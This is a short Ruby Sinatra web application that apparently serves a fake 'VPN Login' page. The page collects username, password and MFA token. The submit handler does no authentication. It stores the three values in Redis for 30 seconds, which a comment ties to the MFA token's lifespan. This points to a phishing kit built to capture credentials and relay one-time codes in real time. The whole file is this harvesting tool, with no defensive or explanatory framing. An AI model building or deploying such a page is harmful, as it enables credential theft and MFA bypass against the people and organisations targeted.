require 'sinatra'
require 'json'
require 'redis'

set :bind, '0.0.0.0'
set :port, 4567

redis = Redis.new(url: ENV['REDIS_URL'])

get '/' do
  <<-HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
      <title>VPN Login</title>
    </head>
    <body class="bg-gray-100 flex items-center justify-center min-h-screen">
      <div class="bg-white p-8 rounded shadow-md w-full max-w-sm">
        <h2 class="text-2xl font-bold mb-6 text-center">VPN Login</h2>
        <form action="/submit" method="post" class="space-y-4">
          <div>
            <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
            <input type="text" name="username" id="username" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
          </div>
          <div>
            <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
            <input type="password" name="password" id="password" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
          </div>
          <div>
            <label for="mfa" class="block text-sm font-medium text-gray-700">MFA Token</label>
            <input type="text" name="mfa" id="mfa" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm">
          </div>
          <div>
            <button type="submit" class="w-full bg-indigo-600 text-white py-2 px-4 rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
              Submit
            </button>
          </div>
        </form>
      </div>
    </body>
    </html>
  HTML
end

post '/submit' do
  username = params['username']
  password = params['password']
  mfa = params['mfa']

  credentials = {
    username: username,
    password: password,
    mfa: mfa
  }

  redis.set('vpn_credentials', credentials.to_json)
  redis.expire('vpn_credentials', 30)  # Set expiration to 30 seconds, that's usually the lifespan of the MFA token.
  "Credentials submitted successfully."
end
